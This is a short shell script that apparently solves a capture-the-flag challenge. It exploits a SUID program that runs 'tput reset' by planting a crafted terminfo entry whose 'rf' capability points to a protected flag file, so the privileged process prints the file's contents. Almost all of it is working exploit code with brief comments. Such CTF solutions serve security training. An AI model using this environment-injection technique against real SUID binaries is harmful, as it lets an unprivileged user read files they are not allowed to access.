#!/bin/sh
#
#  Solution
#  --------
#  1. The SUID binary forks and executes /usr/bin/tput reset.
#  2. The child inherits the effective UID without passing through a shell.
#  3. The tput binary reads the TERMINFO entries and specifically its "rf" (reset_file") capabilities.
#  4. If we set "rf" to point to the flag - it will be written into stdout.
#

# Create the working directory
WORKDIR="$(mktemp -d /tmp/solve_XXXXXX)"
trap 'rm -rf "$WORKDIR"' EXIT

# Create the terminfo entries and specifically the "rf" to point to the flag
cat > "$WORKDIR/src.ti" << 'TIEOF'
swear_solve|swear machine solver,
    am,
    cols#80, lines#24,
    bel=^G,
    cr=\r,
    ind=\n,
    clear=\E[H\E[2J,
    cup=\E[%i%p1%d;%p2%dH,
    el=\E[K,
    rf=/Users/ctf/flag,
TIEOF

# Compile terminfo
tic -o "$WORKDIR" "$WORKDIR/src.ti" 2>/dev/null

# Launch the SUID binary with stdout redirected.
TERMINFO="$WORKDIR" TERM=swear_solve /Users/ctf/swear_machine > "$WORKDIR/capture" 2>/dev/null &
BGPID=$!
sleep 2
kill "$BGPID" 2>/dev/null
wait "$BGPID" 2>/dev/null

printf 'Flag: '
strings "$WORKDIR/capture" | grep -v '^$' | head -n1
